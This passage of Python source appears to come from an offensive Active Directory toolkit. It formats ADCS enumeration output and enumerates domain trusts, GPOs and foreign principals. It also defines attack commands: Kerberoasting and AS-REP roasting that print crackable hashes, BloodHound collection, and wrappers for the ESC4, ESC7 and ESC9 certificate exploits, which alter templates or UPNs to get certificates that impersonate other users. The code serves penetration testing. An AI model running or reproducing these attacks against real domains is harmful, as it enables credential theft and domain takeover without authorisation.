            json_str = json.dumps(output_data, indent=2, default=str)

            if write_to_stdout:
                print(json_str)

            if write_to_file:
                output_file = output if output.endswith('.json') else f"{output}.json"
                with open(output_file, 'w') as f:
                    f.write(json_str)
                logging.info(f"JSON results written to {output_file}")
            return

        # CSV output
        if format == "csv":
            # Generate CSV for CAs
            ca_csv = io.StringIO()
            ca_writer = csv.writer(ca_csv)
            ca_writer.writerow([
                'Name', 'DNS Hostname', 'CA Certificate DN', 'Serial Number',
                'Validity Start', 'Validity End', 'Web Enrollment', 'User Specified SAN',
                'Request Disposition', 'Enforce Encryption', 'Owner', 'Templates Count', 'Templates'
            ])
            for ca in cas:
                ca_writer.writerow([
                    ca.name,
                    ca.dns_hostname,
                    ca.ca_certificate_dn or '',
                    ca.certificate_serial_number or '',
                    str(ca.certificate_validity_start) if ca.certificate_validity_start else '',
                    str(ca.certificate_validity_end) if ca.certificate_validity_end else '',
                    'Enabled' if ca.web_enrollment else ('Disabled' if ca.web_enrollment is False else ''),
                    'Enabled' if ca.user_specified_san else ('Disabled' if ca.user_specified_san is False else ''),
                    ca.request_disposition or '',
                    'Enabled' if ca.enforce_encryption else ('Disabled' if ca.enforce_encryption is False else ''),
                    ca.owner or '',
                    len(ca.certificate_templates),
                    ';'.join(ca.certificate_templates)
                ])

            # Generate CSV for Templates
            tpl_csv = io.StringIO()
            tpl_writer = csv.writer(tpl_csv)
            tpl_writer.writerow([
                'Name', 'Display Name', 'Schema Version', 'Can Enroll', 'Can Write',
                'Enrollee Supplies Subject', 'Client Authentication', 'Any Purpose',
                'Enrollment Agent', 'Manager Approval Required', 'No Security Extension',
                'Authorized Signatures Required', 'EKUs', 'Enabled On CAs',
                'Vulnerabilities', 'Highest Severity'
            ])
            for t in all_templates:
                tpl_writer.writerow([
                    t.name,
                    t.display_name,
                    t.schema_version,
                    t.can_enroll,
                    t.can_write,
                    t.enrollee_supplies_subject,
                    t.client_authentication,
                    t.any_purpose,
                    t.enrollment_agent,
                    t.requires_manager_approval,
                    t.no_security_extension,
                    t.authorized_signatures_required,
                    ';'.join(t.get_eku_names()),
                    ';'.join(t.enabled_on_cas),
                    ';'.join(v['id'] for v in t.vulnerabilities),
                    t.highest_severity or ''
                ])

            if write_to_stdout:
                print("=== Certificate Authorities ===")
                print(ca_csv.getvalue())
                print("\n=== Certificate Templates ===")
                print(tpl_csv.getvalue())

            if write_to_file:
                base_name = output.rsplit('.', 1)[0] if '.' in output else output
                ca_file = f"{base_name}_CAs.csv"
                tpl_file = f"{base_name}_Templates.csv"

                with open(ca_file, 'w', newline='') as f:
                    f.write(ca_csv.getvalue())
                with open(tpl_file, 'w', newline='') as f:
                    f.write(tpl_csv.getvalue())

                logging.info(f"CSV results written to {ca_file} and {tpl_file}")
            return

        # Text output (default) - Certipy-style
        text_output = io.StringIO()
        INDENT = "    "

        def out(line=""):
            text_output.write(line + "\n")

        out("Certificate Authorities")
        if cas:
            for idx, ca in enumerate(cas):
                out(f"  {idx}")
                out(f"{INDENT}CA Name                             : {ca.name}")
                out(f"{INDENT}DNS Name                            : {ca.dns_hostname}")
                if ca.ca_certificate_dn:
                    out(f"{INDENT}Certificate Subject                 : {ca.ca_certificate_dn}")
                if ca.certificate_serial_number:
                    out(f"{INDENT}Certificate Serial Number           : {ca.certificate_serial_number}")
                if ca.certificate_validity_start:
                    out(f"{INDENT}Certificate Validity Start          : {ca.certificate_validity_start}")
                if ca.certificate_validity_end:
                    out(f"{INDENT}Certificate Validity End            : {ca.certificate_validity_end}")
                # CA Configuration (from registry)
                web_enroll = 'Enabled' if ca.web_enrollment else 'Disabled' if ca.web_enrollment is False else 'N/A'
                user_san = 'Enabled' if ca.user_specified_san else 'Disabled' if ca.user_specified_san is False else 'N/A'
                req_disp = ca.request_disposition if ca.request_disposition else 'N/A'
                enforce_enc = 'Enabled' if ca.enforce_encryption else 'Disabled' if ca.enforce_encryption is False else 'N/A'
                out(f"{INDENT}Web Enrollment                      : {web_enroll}")
                out(f"{INDENT}User Specified SAN                  : {user_san}")
                out(f"{INDENT}Request Disposition                 : {req_disp}")
                out(f"{INDENT}Enforce Encryption for Requests     : {enforce_enc}")
                # Permissions
                out(f"{INDENT}Permissions")
                if ca.owner:
                    out(f"{INDENT}  Owner                             : {ca.owner}")
                out(f"{INDENT}  Access Rights")
                if ca.manage_certificates_principals:
                    out(f"{INDENT}    ManageCertificates              : {ca.manage_certificates_principals[0]}")
                    for p in ca.manage_certificates_principals[1:]:
                        out(f"{INDENT}                                      {p}")
                if ca.manage_ca_principals:
                    out(f"{INDENT}    ManageCa                        : {ca.manage_ca_principals[0]}")
                    for p in ca.manage_ca_principals[1:]:
                        out(f"{INDENT}                                      {p}")
                if ca.enroll_principals:
                    out(f"{INDENT}    Enroll                          : {ca.enroll_principals[0]}")
                    for p in ca.enroll_principals[1:]:
                        out(f"{INDENT}                                      {p}")
                out(f"{INDENT}Certificate Templates               : {len(ca.certificate_templates)}")
        else:
            out("  No CAs found")

        out("Certificate Templates")
        if not all_templates:
            out("  No templates found" if not vulnerable_only else "  No vulnerable templates found")
        else:
            sorted_templates = sorted(
                all_templates,
                key=lambda t: (0 if t.is_vulnerable else 1, 0 if t.can_enroll else 1, t.name)
            )

            for idx, template in enumerate(sorted_templates):
                out(f"  {idx}")
                out(f"{INDENT}Template Name                       : {template.name}")
                out(f"{INDENT}Display Name                        : {template.display_name}")
                if template.enabled_on_cas:
                    out(f"{INDENT}Certificate Authorities             : {', '.join(template.enabled_on_cas)}")
                out(f"{INDENT}Enabled                             : {template.enabled}")
                out(f"{INDENT}Client Authentication               : {template.client_authentication}")
                out(f"{INDENT}Enrollment Agent                    : {template.enrollment_agent}")
                out(f"{INDENT}Any Purpose                         : {template.any_purpose}")
                out(f"{INDENT}Enrollee Supplies Subject           : {template.enrollee_supplies_subject}")

                # Certificate Name Flags
                name_flags = template.get_certificate_name_flags()
                if name_flags:
                    out(f"{INDENT}Certificate Name Flag               : {name_flags[0]}")
                    for flag in name_flags[1:]:
                        out(f"{INDENT}                                      {flag}")

                # Enrollment Flags
                enrollment_flags = template.get_enrollment_flags()
                if enrollment_flags:
                    out(f"{INDENT}Enrollment Flag                     : {enrollment_flags[0]}")
                    for flag in enrollment_flags[1:]:
                        out(f"{INDENT}                                      {flag}")

                # Private Key Flags
                pk_flags = template.get_private_key_flags()
                if pk_flags:
                    out(f"{INDENT}Private Key Flag                    : {pk_flags[0]}")
                    for flag in pk_flags[1:]:
                        out(f"{INDENT}                                      {flag}")

                # Extended Key Usage
                ekus = template.get_eku_names()
                if ekus:
                    out(f"{INDENT}Extended Key Usage                  : {ekus[0]}")
                    for eku in ekus[1:]:
                        out(f"{INDENT}                                      {eku}")
                elif template.schema_version == 1:
                    out(f"{INDENT}Extended Key Usage                  : <No EKUs> (Schema v1)")

                out(f"{INDENT}Requires Manager Approval           : {template.requires_manager_approval}")
                out(f"{INDENT}Requires Key Archival               : {template.requires_key_archival}")
                out(f"{INDENT}Authorized Signatures Required      : {template.authorized_signatures_required}")
                out(f"{INDENT}Validity Period                     : {template.validity_period}")
                out(f"{INDENT}Renewal Period                      : {template.renewal_period}")
                out(f"{INDENT}Minimum RSA Key Length              : {template.min_key_size}")

                # Permissions
                out(f"{INDENT}Permissions")

                # Enrollment Permissions
                out(f"{INDENT}  Enrollment Permissions")
                enrollment_rights = [p['principal'] for p in template.enrollment_permissions]
                if enrollment_rights:
                    out(f"{INDENT}    Enrollment Rights               : {enrollment_rights[0]}")
                    for right in enrollment_rights[1:]:
                        out(f"{INDENT}                                      {right}")

                # Object Control Permissions
                out(f"{INDENT}  Object Control Permissions")
                if template.owner:
                    out(f"{INDENT}    Owner                           : {template.owner}")
                if template.write_owner_principals:
                    out(f"{INDENT}    Write Owner Principals          : {template.write_owner_principals[0]}")
                    for p in template.write_owner_principals[1:]:
                        out(f"{INDENT}                                      {p}")
                if template.write_dacl_principals:
                    out(f"{INDENT}    Write Dacl Principals           : {template.write_dacl_principals[0]}")
                    for p in template.write_dacl_principals[1:]:
                        out(f"{INDENT}                                      {p}")
                if template.write_property_principals:
                    out(f"{INDENT}    Write Property Principals       : {template.write_property_principals[0]}")
                    for p in template.write_property_principals[1:]:
                        out(f"{INDENT}                                      {p}")

                # Vulnerabilities
                if template.vulnerabilities:
                    out(f"{INDENT}[!] Vulnerabilities")
                    for vuln in template.vulnerabilities:
                        detail = vuln.get('detail', vuln['description'])
                        out(f"{INDENT}    {vuln['id']:<32}  : {detail}")

        text_content = text_output.getvalue()

        # Print to stdout with colors
        if write_to_stdout:
            colored = text_content
            # Add colors for headers and vulnerability indicators
            colored = colored.replace("Certificate Authorities\n", f"{BOLD}Certificate Authorities{RESET}\n")
            colored = colored.replace("Certificate Templates\n", f"{BOLD}Certificate Templates{RESET}\n")
            colored = colored.replace("[!] Vulnerabilities", f"{LIGHT_RED}[!] Vulnerabilities{RESET}")
            print(colored)

        # Write to file (without colors)
        if write_to_file:
            output_file = output if output.endswith('.txt') else f"{output}.txt"
            with open(output_file, 'w') as f:
                f.write(text_content)
            logging.info(f"Text results written to {output_file}")

    except Exception as e:
        logging.error(f"Error during ADCS enumeration: {e}")
        import traceback
        traceback.print_exc()


def trusts(conn):
    """Enumerate domain trust relationships."""

    TRUST_DIRECTION = {0: 'Disabled', 1: 'Inbound', 2: 'Outbound', 3: 'Bidirectional'}
    TRUST_TYPE = {1: 'Downlevel (non-AD)', 2: 'Uplevel (AD)', 3: 'MIT (Kerberos)', 4: 'DCE'}
    TRUST_ATTR_FLAGS = {
        0x1: 'NON_TRANSITIVE', 0x2: 'UPLEVEL_ONLY', 0x4: 'QUARANTINED_DOMAIN',
        0x8: 'FOREST_TRANSITIVE', 0x10: 'CROSS_ORGANIZATION', 0x20: 'WITHIN_FOREST',
        0x40: 'TREAT_AS_EXTERNAL', 0x80: 'USES_RC4_ENCRYPTION',
        0x200: 'USES_AES_KEYS', 0x400: 'CROSS_ORGANIZATION_NO_TGT_DELEGATION',
        0x800: 'PIM_TRUST',
    }

    try:
        conn._ldap_connection.search(
            conn._baseDN,
            '(objectClass=trustedDomain)',
            attributes=['cn', 'trustDirection', 'trustType', 'trustAttributes',
                        'flatName', 'trustPartner', 'securityIdentifier',
                        'whenCreated', 'whenChanged'])
        entries = conn._ldap_connection.entries
        if not entries:
            logging.info("No domain trusts found")
            return

        logging.info(f"Found {len(entries)} domain trust(s)\n")
        for entry in entries:
            name = entry['cn'].value if 'cn' in entry else '?'
            partner = entry['trustPartner'].value if 'trustPartner' in entry else ''
            flat = entry['flatName'].value if 'flatName' in entry else ''
            direction_val = int(entry['trustDirection'].value) if 'trustDirection' in entry and entry['trustDirection'].value is not None else 0
            ttype_val = int(entry['trustType'].value) if 'trustType' in entry and entry['trustType'].value is not None else 0
            tattrs_val = int(entry['trustAttributes'].value) if 'trustAttributes' in entry and entry['trustAttributes'].value is not None else 0

            direction = TRUST_DIRECTION.get(direction_val, f'Unknown ({direction_val})')
            ttype = TRUST_TYPE.get(ttype_val, f'Unknown ({ttype_val})')
            flags = [v for k, v in TRUST_ATTR_FLAGS.items() if tattrs_val & k]

            print(f"{BOLD}{name}{RESET} ({partner})")
            print(f"  Direction  : {direction}")
            print(f"  Type       : {ttype}")
            print(f"  NetBIOS    : {flat}")
            if flags:
                print(f"  Attributes : {', '.join(flags)}")
            if tattrs_val & 0x4:
                print(f"  {LIGHT_RED}[!] SID Filtering enabled (quarantined){RESET}")
            print()
    except Exception as e:
        logging.error(f"Error enumerating trusts: {e}")


def gpos(conn):
    """Enumerate Group Policy Objects and their OU links."""
    import re as _re

    try:
        conn._ldap_connection.search(
            conn._baseDN,
            '(objectClass=groupPolicyContainer)',
            attributes=['displayName', 'cn', 'gPCFileSysPath', 'flags', 'whenCreated', 'whenChanged', 'distinguishedName'])
        gpo_entries = conn._ldap_connection.entries
        if not gpo_entries:
            logging.info("No GPOs found")
            return

        gpo_map = {}
        for entry in gpo_entries:
            dn = entry.entry_dn
            gpo_map[dn.lower()] = {
                'name': entry['displayName'].value if 'displayName' in entry else '',
                'guid': entry['cn'].value if 'cn' in entry else '',
                'path': entry['gPCFileSysPath'].value if 'gPCFileSysPath' in entry else '',
                'flags': int(entry['flags'].value) if 'flags' in entry and entry['flags'].value is not None else 0,
                'dn': dn,
                'links': [],
            }

        conn._ldap_connection.search(
            conn._baseDN,
            '(gPLink=*)',
            attributes=['distinguishedName', 'gPLink', 'name'])
        for entry in conn._ldap_connection.entries:
            gplink = entry['gPLink'].value if 'gPLink' in entry else ''
            ou_dn = entry.entry_dn
            ou_name = entry['name'].value if 'name' in entry else ou_dn
            if gplink:
                for match in _re.finditer(r'\[LDAP://([^;]+);(\d+)\]', gplink, _re.IGNORECASE):
                    linked_dn = match.group(1).lower()
                    enforced = int(match.group(2)) & 2
                    if linked_dn in gpo_map:
                        gpo_map[linked_dn]['links'].append({
                            'ou': ou_name, 'ou_dn': ou_dn, 'enforced': bool(enforced)
                        })

        logging.info(f"Found {len(gpo_entries)} GPO(s)\n")
        for gpo in gpo_map.values():
            status = 'Disabled' if gpo['flags'] == 3 else 'User disabled' if gpo['flags'] == 1 else 'Computer disabled' if gpo['flags'] == 2 else 'Enabled'
            print(f"{BOLD}{gpo['name']}{RESET}  [{gpo['guid']}]")
            print(f"  Status : {status}")
            if gpo['path']:
                print(f"  Path   : {gpo['path']}")
            if gpo['links']:
                links_str = ', '.join(
                    f"{l['ou']}{'(enforced)' if l['enforced'] else ''}" for l in gpo['links']
                )
                print(f"  Links  : {links_str}")
            else:
                print(f"  Links  : (none)")
            print()
    except Exception as e:
        logging.error(f"Error enumerating GPOs: {e}")


def foreign_members(conn):
    """Enumerate foreign security principals and cross-domain group members."""
    try:
        foreign_users = []
        conn._ldap_connection.search(
            f"CN=ForeignSecurityPrincipals,{conn._baseDN}",
            '(objectClass=foreignSecurityPrincipal)',
            attributes=['objectSid', 'distinguishedName', 'memberOf'])

        domain_sid = conn.get_domain_sid()

        for entry in conn._ldap_connection.entries:
            sid = entry['objectSid'].value if 'objectSid' in entry else ''
            if not sid or (domain_sid and sid.startswith(domain_sid)):
                continue
            member_of = entry['memberOf'].values if 'memberOf' in entry and entry['memberOf'].value else []
            foreign_users.append({'sid': sid, 'dn': entry.entry_dn, 'member_of': member_of})

        cross_domain = []
        conn._ldap_connection.search(
            conn._baseDN,
            '(&(objectClass=group)(member=*))',
            attributes=['sAMAccountName', 'distinguishedName', 'member'])
        base_dn_lower = conn._baseDN.lower()
        for entry in conn._ldap_connection.entries:
            members = entry['member'].values if 'member' in entry and entry['member'].value else []
            group_name = entry['sAMAccountName'].value if 'sAMAccountName' in entry else entry.entry_dn
            for member_dn in members:
                if not member_dn.lower().endswith(base_dn_lower):
                    cross_domain.append({'group': group_name, 'group_dn': entry.entry_dn, 'member_dn': member_dn})

        if not foreign_users and not cross_domain:
            logging.info("No foreign security principals or cross-domain members found")
            return

        if foreign_users:
            logging.info(f"Foreign Security Principals ({len(foreign_users)}):\n")
            for f in foreign_users:
                print(f"  SID: {BLUE}{f['sid']}{RESET}")
                if f['member_of']:
                    groups = [dn.split(',')[0].replace('CN=', '') for dn in f['member_of']]
                    print(f"    Member of: {', '.join(groups)}")
                print()

        if cross_domain:
            logging.info(f"Cross-Domain Group Members ({len(cross_domain)}):\n")
            for m in cross_domain:
                print(f"  Group: {BLUE}{m['group']}{RESET}")
                print(f"    External member: {m['member_dn']}")
                print()

    except Exception as e:
        logging.error(f"Error enumerating foreign members: {e}")


def kerberoast(conn, target=None):
    """Request TGS hashes for kerberoastable accounts (hashcat-compatible output).

    Without target, automatically discovers and roasts all kerberoastable users.
    The TGT is requested once and reused for all targets.
    """
    try:
        from pwnAD.lib.kerberos import kerberoast_account, _get_tgt

        if target:
            escaped = escape_filter_chars(target)
            ldap_filter = f'(&(sAMAccountName={escaped})(servicePrincipalName=*))'
        else:
            ldap_filter = '(&(samAccountType=805306368)(servicePrincipalName=*)(!(samAccountName=krbtgt))(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))'

        conn._ldap_connection.search(conn._baseDN, ldap_filter, attributes=['sAMAccountName', 'servicePrincipalName'])
        if not conn._ldap_connection.entries:
            if target:
                logging.error(f"No SPN found for {target}")
            else:
                logging.info("No kerberoastable accounts found")
            return

        targets = []
        for entry in conn._ldap_connection.entries:
            sam = entry['sAMAccountName'].value
            spns = entry['servicePrincipalName'].values
            if spns:
                spn = spns[0] if isinstance(spns, list) else spns
                targets.append((sam, spn))

        if not targets:
            logging.info("No kerberoastable accounts found")
            return

        logging.info(f"Roasting {len(targets)} account(s)...")
        tgt_data = _get_tgt(conn)

        for sam, spn in targets:
            try:
                print(kerberoast_account(conn, sam, spn, tgt_data=tgt_data))
            except Exception as e:
                logging.error(f"Failed to roast {sam}: {e}")

    except Exception as e:
        logging.error(f"Kerberoast error: {e}")


def asreproast(conn, target=None):
    """Request AS-REP hashes for accounts without Kerberos pre-auth (hashcat-compatible output).

    Without target, automatically discovers and roasts all AS-REP roastable users.
    """
    try:
        from pwnAD.lib.kerberos import asreproast_account

        if target:
            targets = [target]
        else:
            conn._ldap_connection.search(
                conn._baseDN,
                '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))',
                attributes=['sAMAccountName'])
            if not conn._ldap_connection.entries:
                logging.info("No AS-REP roastable accounts found")
                return
            targets = [e['sAMAccountName'].value for e in conn._ldap_connection.entries]

        logging.info(f"Roasting {len(targets)} account(s)...")

        for acct in targets:
            try:
                print(asreproast_account(conn, acct))
            except Exception as e:
                logging.error(f"Failed to roast {acct}: {e}")

    except Exception as e:
        logging.error(f"AS-REP Roast error: {e}")


def bloodhound(conn, output_dir='.', prefix='', collect=None, workers=10,
               nameserver=None, exclude_dcs=False):
    """Export domain data to BloodHound CE format via bloodhound-ce."""
    try:
        from pwnAD.lib.bloodhound import _run_collection, COLLECT_ALL
        from bloodhound import resolve_collection_methods

        if collect is None:
            methods = COLLECT_ALL
        else:
            methods = resolve_collection_methods(collect)
            if not methods:
                logging.error(f"Invalid collection method: {collect}")
                return

        zip_path = _run_collection(
            conn, output_dir=output_dir, prefix=prefix,
            collect=methods, num_workers=workers, exclude_dcs=exclude_dcs,
            nameserver=nameserver,
        )
        print(f"\n[+] BloodHound CE export saved to: {zip_path}")
    except ImportError:
        logging.error("bloodhound-ce package not installed. Run: pip install bloodhound-ce")
    except Exception as e:
        logging.error(f"BloodHound export error: {e}")


def adcs_req(conn, ca_name, template, upn=None, dns=None, sid=None,
             subject=None, ca_host=None, key_size=2048, output=None):
    """Request a certificate from ADCS via MS-ICPR RPC."""
    try:
        from pwnAD.lib.certreq import request_certificate
        pfx_path, cert, key = request_certificate(
            conn, ca_name=ca_name, template=template,
            ca_host=ca_host, upn=upn, dns=dns, sid=sid,
            subject=subject, key_size=key_size, output=output,
        )
        print(f"\n[+] Certificate saved to: {pfx_path}")
    except Exception as e:
        logging.error(f"ADCS request error: {e}")


def esc4(conn, ca_name, template, upn, ca_host=None, key_size=2048, output=None):
    """ESC4: modify writable template, request cert, restore."""
    try:
        from pwnAD.lib.certreq import exploit_esc4
        pfx_path, cert, key = exploit_esc4(
            conn, ca_name=ca_name, template_name=template,
            target_upn=upn, ca_host=ca_host,
            key_size=key_size, output=output,
        )
        print(f"\n[+] ESC4 exploit successful — certificate saved to: {pfx_path}")
    except Exception as e:
        logging.error(f"ESC4 exploit error: {e}")


def esc7(conn, ca_name, upn, template=None, ca_host=None,
         key_size=2048, output=None, restore=True):
    """ESC7: enable EDITF_ATTRIBUTESUBJECTALTNAME2 via ManageCA, request cert, restore."""
    try:
        from pwnAD.lib.certreq import exploit_esc7_manage_ca
        pfx_path, cert, key = exploit_esc7_manage_ca(
            conn, ca_name=ca_name, template_name=template,
            target_upn=upn, ca_host=ca_host,
            key_size=key_size, output=output, restore=restore,
        )
        print(f"\n[+] ESC7 exploit successful — certificate saved to: {pfx_path}")
    except Exception as e:
        logging.error(f"ESC7 exploit error: {e}")


def esc9(conn, target_sam, ca_name, template, upn,
         ca_host=None, key_size=2048, output=None):
    """ESC9/ESC10: swap UPN on target, request cert, restore."""
    try:
        from pwnAD.lib.certreq import exploit_esc9
        pfx_path, cert, key = exploit_esc9(
            conn, target_sam=target_sam, ca_name=ca_name,
            template_name=template, impersonate_upn=upn,
            ca_host=ca_host, key_size=key_size, output=output,
        )
        print(f"\n[+] ESC9 exploit successful — certificate saved to: {pfx_path}")
    except Exception as e:
        logging.error(f"ESC9 exploit error: {e}")
